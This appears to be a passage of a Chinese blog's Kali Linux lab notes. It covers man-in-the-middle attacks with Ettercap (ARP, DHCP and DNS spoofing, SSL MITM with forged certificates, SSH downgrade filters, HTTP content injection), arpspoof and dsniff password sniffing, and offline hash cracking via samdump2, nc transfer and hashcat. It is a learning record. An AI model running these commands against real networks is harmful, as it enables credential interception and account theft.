+<li>–ferretng（抓取cookie）、–browserprofiler（浏览器及插件信息） </li>
+<li>–smbtrap（抓取smb）、–smbauth（smb认证）</li>
+<li>–hsts（新的安全协议）<ul>
+<li>HTTP Strict Transport Security </li>
+<li>防止协议降级、cookie窃取 </li>
+<li>安全策略通过HTTP响应头”Strict-Transport-Security”实施 </li>
+<li>限制user-agent、https等</li>
+</ul>
+</li>
+<li>–filepwn（EXE执行程序的下载，插入后门程序）<ul>
+<li>凌空插后门 </li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-中间人攻击–Ettercap"><a href="#3-中间人攻击–Ettercap" class="headerlink" title="3. 中间人攻击–Ettercap"></a>3. 中间人攻击–Ettercap</h4><ul>
+<li>Ettercap ▲ 2020.1.24Ettercap有点小问题，关于主机发现这一模块<ul>
+<li>统一的中间人攻击工具 </li>
+<li>转发MAC与本机相同，但IP与本机不同的数据包 </li>
+<li>支持SSH1、SSL中间人攻击</li>
+</ul>
+</li>
+<li>模块划分 <ul>
+<li>Snifer </li>
+<li>MITM </li>
+<li>Filter </li>
+<li>Log </li>
+<li>Plugin</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-Ettercap–Snifer"><a href="#4-Ettercap–Snifer" class="headerlink" title="4. Ettercap–Snifer"></a>4. Ettercap–Snifer</h4><ul>
+<li>Snifer<ul>
+<li>负责数据包转发</li>
+<li>Unified<ul>
+<li>单网卡情况下独立完成三层包转发</li>
+<li>始终禁用内核IP_Forward功能</li>
+</ul>
+</li>
+<li>Bridge <ul>
+<li>双网卡情况下的一层MITM模式</li>
+<li>可作为IPS过滤数据包</li>
+<li>不可在网关上使用（透明网桥）</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="5-Ettercap–MITM"><a href="#5-Ettercap–MITM" class="headerlink" title="5. Ettercap–MITM"></a>5. Ettercap–MITM</h4><ul>
+<li>MITM <ul>
+<li>把流量重定向到ettercap主机上 </li>
+<li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li>
+</ul>
+</li>
+<li>实现MITM的方法 <ul>
+<li>ARP（一般为动态类型的ARP表）</li>
+<li>ICMP <ul>
+<li>ICMP路由重定向，半双工，回包不经过Kali（去包回包都经过Kali为全双工）</li>
+<li>-M icmp:00:11:22:33:44:55/10.0.0.1（真实网关的MAC/IP）</li>
+</ul>
+</li>
+<li>DHCP <ul>
+<li>修改网关地址，半双工，回包不经过Kali</li>
+<li>DHCP发包过程Discover、Offer、Resquest、ACK</li>
+<li>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1（DNS）</li>
+</ul>
+</li>
+<li>Switch Port Stealing（交换机端口窃取）<ul>
+<li>交换机根据源MAC地址更新</li>
+<li>flood目标地址是本机，源地址是受害者的包（向交换机发送大量泛洪攻击）</li>
+<li>适用于ARP静态绑定的环境（arp -s → 添加静态绑定的ARP）</li>
+<li>-M port /1.1.1.1/ /1.1.1.2/ </li>
+</ul>
+</li>
+<li>NDP <ul>
+<li>IPv6协议欺骗技术</li>
+<li>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Linux2.4以上内核对ARP地址欺骗的约束 <ul>
+<li>收到非请求的ARP响应包，不更新本地ARP缓存 </li>
+<li>Ettercap使用ARP request包进行攻击 </li>
+</ul>
+</li>
+<li>Solaris不根据ARP包更新本地ARP缓存 <ul>
+<li>Ettercap使用先发ICMP包来更新ARP缓存</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-Ettercap–准备"><a href="#6-Ettercap–准备" class="headerlink" title="6. Ettercap–准备"></a>6. Ettercap–准备</h4><ul>
+<li>用户操作界面 <ul>
+<li>-T 文本界面（文本字符）</li>
+<li>-G 图形界面 </li>
+<li>-C 基于文本的图形界面（文本类似图形化）</li>
+<li>-D 后台模式 </li>
+</ul>
+</li>
+<li>指定目标 <ul>
+<li>IPv4：MAC/IPv4/Ports </li>
+<li>IPv6：MAC/IPv4/IPv6/Ports </li>
+<li>/10.0.0.1−5;10.0.1.33/20−25,80,110</li>
+</ul>
+</li>
+<li>权限 <ul>
+<li>主配置文件：/etc/ettercap/etter.conf</li>
+<li>需要root权限打开链路层Socket连接，然后使用nobody账号运行 </li>
+<li>日志写入目录需要nobody有写入权 </li>
+<li>修改etter.conf：EC_UID=65534/EC_GID=65534 → EC_UID=0/EC_GID=0</li>
+</ul>
+</li>
+<li>基于伪造证书的SSL MITIM <ul>
+<li>Bridge模式不支持SSL MITM ▲ 2020.1.24报额外参数的错误</li>
+<li><strong><code>🔺命令：openssl genrsa −out etter.ssl.crt 1024</code></strong> </li>
+<li><strong><code>🔺命令：openssl req −new−keyetter.ssl.crt −out tmp.csr</code></strong> </li>
+<li><strong><code>🔺命令：openssl x509 −req −days 1825 −in tmp.csr −signkey etter.ssl.crt −out tmp.new</code></strong> </li>
+<li><strong><code>🔺命令：cat tmp.new&gt;&gt;etter.ssl.crt</code></strong></li>
+<li><strong><code>🔺命令：rm −f tmp.newtmp.csr</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="7-Ettercap–字符模式"><a href="#7-Ettercap–字符模式" class="headerlink" title="7. Ettercap–字符模式"></a>7. Ettercap–字符模式</h4><ul>
+<li>参数<ul>
+<li>-M（MITM技术）</li>
+<li>-F（过滤器）</li>
+<li>-P（模块）</li>
+<li>-w（网络流量记录）</li>
+<li>-l（简单记录日志）</li>
+<li>-L（记录所有日志信息）</li>
+<li>-m（账号密码信息）</li>
+<li>-q（安静模式/有用的信息）</li>
+</ul>
+</li>
+<li>MITM攻击<ul>
+<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></strong></li>
+<li>找一个FTP服务器</li>
+<li>输入账号/密码</li>
+<li>查看ettercap字符界面</li>
+</ul>
+</li>
+<li>Ettercap 日志查看 ▲ 2020.1.24查看无权限<ul>
+<li><strong><code>🔺命令：cat message</code></strong>（root目录下）</li>
+<li><strong><code>🔺命令：ls log发现文件是加密信息</code></strong></li>
+<li><strong><code>🔺命令：etterlog -p log.eci 查看获取的密码</code></strong></li>
+<li><strong><code>🔺命令：etterlog -c log.ecp 列出Log中的连接</code></strong></li>
+<li><strong><code>🔺命令：etterlog -c -f //1.1.1.1/ log.ecp</code></strong></li>
+<li><strong><code>🔺命令：etterlog -B -n -s -F TCP:1.1.1.1:20;1.1.1.2:1234 log.ecp &gt; aa 选择相应的连接并榨取文件</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="8-Ettercap–图形界面"><a href="#8-Ettercap–图形界面" class="headerlink" title="8. Ettercap–图形界面"></a>8. Ettercap–图形界面</h4><ul>
+<li>Sniff → Unified/Bridge sniffing → 网卡</li>
+<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
+<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
+<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
+<li>Start → Start sniffing</li>
+<li>找一个FTP服务器</li>
+<li>输入账号/密码</li>
+<li>查看ettercap图形界面</li>
+</ul>
+<h4 id="9-Ettercap–SSL中间人攻击"><a href="#9-Ettercap–SSL中间人攻击" class="headerlink" title="9. Ettercap–SSL中间人攻击"></a>9. Ettercap–SSL中间人攻击</h4><ul>
+<li>SSL MITM（默认无开启，需要在配置文件中修改，图形界面）<ul>
+<li><strong><code>🔺命令：vi /etc/ettercap/etter.conf</code></strong>（Linux → The second iptables）</li>
+<li>Sniff → Unified/Bridge sniffing → 网卡</li>
+<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
+<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
+<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
+<li>Start → Start sniffing</li>
+<li>找一个有SSL页面</li>
+<li>输入账号/密码</li>
+<li>查看ettercap图形界面</li>
+</ul>
+</li>
+</ul>
+<h4 id="10-Ettercap–DNS欺骗"><a href="#10-Ettercap–DNS欺骗" class="headerlink" title="10. Ettercap–DNS欺骗"></a>10. Ettercap–DNS欺骗</h4><ul>
+<li>DNS欺骗（图形界面） <ul>
+<li>dns_spoof插件配置文件 </li>
+<li><strong><code>🔺命令：vi /etc/ettercap/etter.dns</code></strong>（修改欺骗的域名对应的IP地址）</li>
+<li>Plugins → Load a plugins → Load ec_dns_spoof.so</li>
+<li>Plugins → Manage the plugins → 双击dns_spoof启动</li>
+<li>Sniff → Unified/Bridge sniffing → 网卡</li>
+<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
+<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
+<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
+<li>Start → Start sniffing</li>
+<li>找一个有SSL页面</li>
+<li>输入账号/密码</li>
+<li>查看ettercap图形界面</li>
+</ul>
+</li>
+<li>DNS欺骗（字符界面）<ul>
+<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -P dns_spoof</code></strong></li>
+<li><strong><code>🔺命令：ipconfig /flushdns</code></strong></li>
+<li><strong><code>🔺命令：ping 欺骗的域名</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="11-Ettercap–Filter"><a href="#11-Ettercap–Filter" class="headerlink" title="11. Ettercap–Filter"></a>11. Ettercap–Filter</h4><ul>
+<li>Filter <ul>
+<li>/usr/share/ettercap/</li>
+<li>▲ SSH-2.xx / SSH-1.99（既支持SSH-1，也支持SSH-2） / SSH-1.51</li>
+<li>etter.filter.ssh（ssh过滤文件，把SSH-2.xx/SSH-1.99转变为SSH-1.51）</li>
+<li><strong><code>🔺命令：etterfilter etter.filter.ssh -o ssh.ef</code></strong></li>
+<li><strong><code>🔺命令：mv ssh.ef /root</code></strong></li>
+<li>直接调用 -F ssh.ef（若发送SSH-1.99，则降级SSH-1.99为SSH-1.51）</li>
+</ul>
+</li>
+<li>替换HTTP内容（图片的内容可以替换为一个EXE或者脚本文件）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (ip.proto == TCP &amp;&amp; tcp.src == 80) &#123; </span><br><span class="line">     msg(&quot;data on TCP 80\n&quot;); </span><br><span class="line">         replace(&quot;img src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG SRC=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); </span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--ARP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97%E3%80%81DNS%E4%BB%A3%E7%90%86%E6%AC%BA%E9%AA%97/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--ARP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97%E3%80%81DNS%E4%BB%A3%E7%90%86%E6%AC%BA%E9%AA%97/" itemprop="url">Kali Linux笔记(六十二)：密码嗅探--ARP地址欺骗、DNS代理欺骗</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-27T23:12:02+08:00">
+                2020-01-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  808 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-密码嗅探"><a href="#1-密码嗅探" class="headerlink" title="1. 密码嗅探"></a>1. 密码嗅探</h4><ul>
+<li>二、三层地址<ul>
+<li>IP网络到网络</li>
+<li>MAC主机到主机（硬件固化地址，广播寻址）</li>
+<li>▲ 路由器不转发广播</li>
+<li>▲ 局域网内MAC寻址，广域网IP寻址</li>
+</ul>
+</li>
+<li>交换机与HUB<ul>
+<li>▲ HUB是物理层的设备，非二层设备，不识别MAC地址</li>
+<li>HUB全端口转发，只要有数据包就转发给本网络所有主机（不安全）</li>
+<li>交换机根据学习地址转发，形成APR地址列表</li>
+<li>混杂模式抓包</li>
+</ul>
+</li>
+<li>ARP协议（IP地址解析程MAC地址）<ul>
+<li>免费ARP</li>
+<li>基于广播学习</li>
+<li>以太网头、ARP头</li>
+<li>▲ 请求、响应相对独立（不请求也可以响应，可以人为构造响应包）</li>
+<li>▲ 基于传闻的协议（无条件接受响应包，ARP地址欺骗根源）</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-ARP地址欺骗（Win-7-→-Kali，单向欺骗）"><a href="#2-ARP地址欺骗（Win-7-→-Kali，单向欺骗）" class="headerlink" title="2. ARP地址欺骗（Win 7 → Kali，单向欺骗）"></a>2. ARP地址欺骗（Win 7 → Kali，单向欺骗）</h4><ul>
+<li><strong><code>🔺命令：ping 网关</code></strong>（查看网络连通性）</li>
+<li><strong><code>🔺命令：arp -a</code></strong>（查看网关地址）</li>
+<li>使用OmniPeek构造ARP数据包，先抓取ARP的数据包</li>
+<li><strong><code>🔺命令：arp -d</code></strong>（清除ARP缓存）</li>
+<li><strong><code>🔺命令：ping 网关</code></strong>（重新发arp包）</li>
+<li>选取ARP Response的数据包，Send → Edit Send Packet</li>
+<li><strong><code>🔺命令：ping Kali的IP地址/arp -a</code></strong>（查看Kali的MAC地址）</li>
+<li>Ethernet → 修改目的地的MAC地址为Kali的MAC地址</li>
+<li>Ethernet → 修改源地址的MAC地址为Win7的MAC地址</li>
+<li>ARP → Target Hardware Addr → Kali的MAC地址</li>
+<li>ARP → Target Internet Addr → Kali的IP地址</li>
+<li>Send → Send Window → Transmit One（可能需要持续发包）</li>
+<li>Kali查看arp → <strong><code>🔺命令：arp -an</code></strong></li>
+<li>Win7/kali抓包都可以看到ARP地址欺骗效果（发送ping数据包）</li>
+<li>▲ 2020.1.27 Omnipeek need a Universal C Runtime</li>
+</ul>
+<h4 id="3-ARP地址欺骗（Kali-→-Win7）"><a href="#3-ARP地址欺骗（Kali-→-Win7）" class="headerlink" title="3. ARP地址欺骗（Kali → Win7）"></a>3. ARP地址欺骗（Kali → Win7）</h4><ul>
+<li>手动修改数据包实现ARP欺骗</li>
+<li>arpspoof（双向欺骗+路由转发）<ul>
+<li><strong><code>🔺命令：echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></strong> </li>
+<li><strong><code>🔺命令：arpspoof -t（目标） 1.1.1.12 -r（路由器） 1.1.1.1</code></strong>（发送的是arp的Rely）</li>
+</ul>
+</li>
+<li>网络嗅探<ul>
+<li>driftnet（传输图片的还原）<ul>
+<li>-i（选择端口）</li>
+<li>-a（存放保存）</li>
+<li>-d（存放的路径）</li>
+<li>-s（声音文件的保存）</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：driftnet -i eth0 -a -d /root/Desktop/tem -s</code></strong></li>
+<li><strong><code>🔺命令：webspy -i eth0 1.1.1.1</code></strong>（抓取网络url地址）▲ 2020.1.27只能一个一个进行截取</li>
+<li><strong><code>🔺命令：urlsnarf -i eth0</code></strong>（访问端口截断解析）</li>
+<li><strong><code>🔺命令：dsniff -i eth0 -m</code></strong>（密码嗅探截获）<ul>
+<li>/usr/share/dsniff/dsniff.services（支持协议解码类型）</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：dnsspoof -i eth0 -f /usr/lib/x86_64-linux-gnu/dnsspoof.hosts</code></strong>（DNS欺骗）<ul>
+<li><strong><code>🔺命令：vi /usr/lib/x86_64-linux-gnu/</code></strong>dnsspoof.hosts（侦听目标机器53端口）</li>
+<li>192.168.1.1 → *.taobao.com</li>
+<li>Win7访问<a href="http://www.taobao.com（发生重定向）" target="_blank" rel="noopener">www.taobao.com（发生重定向）</a></li>
+<li>▲ 2020.1.27 dnsspoof无法进行重定向，无法达到DNS欺骗的目的</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-DNS代理欺骗（Kali-→-Win7，实现流量的重定向）"><a href="#4-DNS代理欺骗（Kali-→-Win7，实现流量的重定向）" class="headerlink" title="4. DNS代理欺骗（Kali → Win7，实现流量的重定向）"></a>4. DNS代理欺骗（Kali → Win7，实现流量的重定向）</h4><ul>
+<li>前提：有能力修改客户端的网络参数的配置（DNS/Host修改配置）</li>
+<li>dnschef<ul>
+<li>–fakeip（欺骗解析到的IP地址）</li>
+<li>–fakedomains（伪造欺骗的域名）</li>
+<li>–interface（进行网卡欺骗的动作，DNS侦听动作）</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：dnschef --fakeip=1.1.1.10 --fakedomains=www.google.com,www.youtube.com --interface 1.1.1.2（Kali主机IP）-q</code></strong></li>
+<li>将被害者DNS指向伪造的DNS服务器（Win7修改DNS服务器）</li>
+<li>Win7和Kali进行抓包比对</li>
+<li>ping一个没有欺骗的域名看是否正常运作</li>
+<li>▲ 2020.1.27可进行正常运行，也能截获到数据包，但无法进行重定向</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%80)%EF%BC%9A%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%80)%EF%BC%9A%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" itemprop="url">Kali Linux笔记(六十一)：离线密码破解</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-26T22:35:12+08:00">
+                2020-01-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  8 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-离线密码破解"><a href="#1-离线密码破解" class="headerlink" title="1. 离线密码破解"></a>1. 离线密码破解</h4><ul>
+<li>身份认证<ul>
+<li>禁止明文传输密码（存在大的安全问题）</li>
+<li>每次认证使用HASH算法加密密码传输（HASH算法加密容易、解密困难）</li>
+<li>服务器端用户数据应加严加密保存</li>
+<li>服务器端保存用户密码的哈希值（进行哈希值匹配）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐哈希算法是单向算法，逆向碰撞在数学上是存在不可行性，只能通过碰撞去破解</code></pre></blockquote>
+<ul>
+<li>破解思路<ul>
+<li>嗅探获取密码HASH</li>
+<li>利用漏洞登陆服务器并从用户数据库获取HASH</li>
+<li>识别HASH类型（长度、字符集）</li>
+<li>利用离线破解工具碰撞密码HASH</li>
+</ul>
+</li>
+<li>优势<ul>
+<li>离线不会触发密码锁定机制</li>
+<li>不会产生大量登陆失败日志引起管理员注意</li>
+</ul>
+</li>
+<li>HASH识别工具<ul>
+<li>hash-identifier</li>
+<li>Hashid</li>
+<li>▲ 可能识别错误或无法识别</li>
+<li>安装浏览器插件：hashr ▲ 2020.1.25无法找到hashr插件</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：hash-identifier</code></strong><ul>
+<li>直接贴入hash值</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：hashid hash值</code></strong></li>
+</ul>
+<h4 id="2-Windows-HASH获取–已有登陆账号（Win7）"><a href="#2-Windows-HASH获取–已有登陆账号（Win7）" class="headerlink" title="2. Windows HASH获取–已有登陆账号（Win7）"></a>2. Windows HASH获取–已有登陆账号（Win7）</h4><ul>
+<li>SAM数据库，身份提权等   </li>
+<li>利用漏洞：Pwdump、fgdump、 mimikatz、wce </li>
+</ul>
+<h4 id="3-Windows-HASH获取–未有登陆账号（Win7）"><a href="#3-Windows-HASH获取–未有登陆账号（Win7）" class="headerlink" title="3. Windows HASH获取–未有登陆账号（Win7）"></a>3. Windows HASH获取–未有登陆账号（Win7）</h4><ul>
+<li>物理接触：samdump2</li>
+<li>插入一张Kali ISO 启动虚拟机，用Kali启动电脑，进入Live模式</li>
+<li><strong><code>🔺命令：fdisk -l</code></strong>（查看本地硬盘）</li>
+<li><strong><code>🔺命令：mount /dev/sda1 /mdedia</code></strong>（小容量分区，引导文件）</li>
+<li><strong><code>🔺命令：mount /dev/sda2 /mnt</code></strong>（大容量分区，操作系统文件）</li>
+<li><strong><code>🔺命令：ls /mnt</code></strong>（存在windows目录）</li>
+<li><strong><code>🔺命令：cd /mnt/Windows/System32/config</code></strong><ul>
+<li>SYSTEM目录保存一个密钥，用于加密SAM数据库，默认不设置，设置后需输入两次密码 </li>
+</ul>
+</li>
+<li><strong><code>🔺命令：samdump2 SYSTEM SAM -o sam.hash</code></strong><ul>
+<li>Win7/Win8默认禁用Administrator/Guest账号，需要手动右键运行</li>
+<li>Win7/Win8废弃LMHash，只用NTLMHash</li>
+</ul>
+</li>
+<li>利用nc传输HASH<ul>
+<li><strong><code>🔺命令：nc -nvlp 3333</code></strong>（攻击者的Kali）</li>
+<li><strong><code>🔺命令：nc IP地址 3333</code></strong>（Window上的Kali）</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-Hashcat"><a href="#4-Hashcat" class="headerlink" title="4. Hashcat"></a>4. Hashcat</h4><ul>
+<li>开源多线程密码破解工具 </li>
+<li>支持80多种加密算法破解</li>
+<li>基于CPU的计算能力破解</li>
+<li>支持通配符，模式（hashcat -h）</li>
+<li>常用参数/命令<ul>
+<li>-m（hash值的类型）<ul>
+<li><strong><code>🔺命令：echo 哈希值 sam.hash</code></strong></li>
+<li><strong><code>🔺命令：hashcat -m 1000 sam.hash pass.lst</code></strong>（NTLM）</li>
+<li><strong><code>🔺命令：hashcat -m 100 hash.dump pass.lst</code></strong>（SHA-1）</li>
+<li><strong><code>🔺命令：hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l?d?d</code></strong>（MD5）</li>
+</ul>
+</li>
+<li>-a（选用字典的模式）</li>
+<li>-b（测试当前机器CPU计算能力）</li>
+<li><strong><code>🔺命令：hashcat -m 100 -a 3 hash -i --increment-min（增量） 6 --increment-max 8 ?l?l?l?l?l?l?l?l</code></strong> </li>
+</ul>
+</li>
+<li>通配符<ul>
+<li>?l = abcdefghijklmnopqrstuvwxyz </li>
+<li>?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ </li>
+<li>?d = 0123456789 </li>
+<li>?s =  !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~ </li>
+<li>?a = ?l?u?d?s </li>
+<li>?b = 0x00 - 0xff</li>
+</ul>
+</li>
+<li>六种模式 <ul>
+<li>0 Straight：字典破解 </li>
+<li>1 Combination：将字典中密码进行组合（1 2 &gt; 11 22 12 21） </li>
+<li>2 Toggle case：尝试字典中所有密码的大小写字母组合 </li>
+<li>3 Brute force：指定字符集（或全部字符集）所有组合 </li>
+<li>4 Permutation：字典中密码的全部字符置换组合（12 21） </li>
+<li>5 Table-lookup：程序为字典中所有密码自动生成掩码</li>
+</ul>
+</li>
+<li>▲ 2020.1.26This device’s constant buffer size is too small/This device’s local mem size is too small猜测需要用到显卡GPU</li>
+<li>▲ 2020.1.26从hashcat 3.30开始，在虚拟机中运行hashcat经常会报错，提示GPU错误。这是由于从该版本开始，hashcat对于Intel CPU会自动检测Intel OpenCL运行时，即是否支持GPU破解。如果不支持，就会停止运行。还有需要缓存足够，用户可添加隐藏选项–force来强制运行，也不一定好使。</li>
+<li>▲ 2020.1.26在物理机上可以正常使用</li>
+</ul>
+<p><img src="/images/kali/kali-notepad/hashcat.PNG" alt="hashcat使用"></p>
+<h4 id="5-Syskey（Window的操作系统工具）"><a href="#5-Syskey（Window的操作系统工具）" class="headerlink" title="5. Syskey（Window的操作系统工具）"></a>5. Syskey（Window的操作系统工具）</h4><ul>
+<li>使用Bootkey利用RC4算法加密SAM数据库<ul>
+<li>Win+R → syskey</li>
+<li>设置Bootkey</li>
+<li>在软盘上保存启动密码/在本机上保存启动密码</li>
+<li>尝试破解Bootkey加密后的密码（两次密码不对应，也难以破解）</li>
+</ul>
+</li>
+<li>Bootkey保存于SYSTEM文件中 </li>
+<li>Bkhive <ul>
+<li>从SYSTEM文件中提取bootkey </li>
+<li>Kali 2.0 抛弃了bkhive（工具已经长期不更新，安装过程问题也较多）</li>
+<li>编译安装：<a href="http://http.us.debian.org/debian/pool/main/b/bkhive/" target="_blank" rel="noopener">http://http.us.debian.org/debian/pool/main/b/bkhive/</a><ul>
+<li>下载tar.gz的源码包（bkhive_1.1.1.orig.tar.gz）</li>
+<li><strong><code>🔺命令：tar -zxvf *.tar.gz</code></strong></li>
+<li><strong><code>🔺命令：cd bkhive</code></strong></li>
+<li><strong><code>🔺命令：make</code></strong></li>
+<li><strong><code>🔺命令：make install</code></strong> </li>
+<li><strong><code>🔺命令：apt-get -f install</code></strong></li>
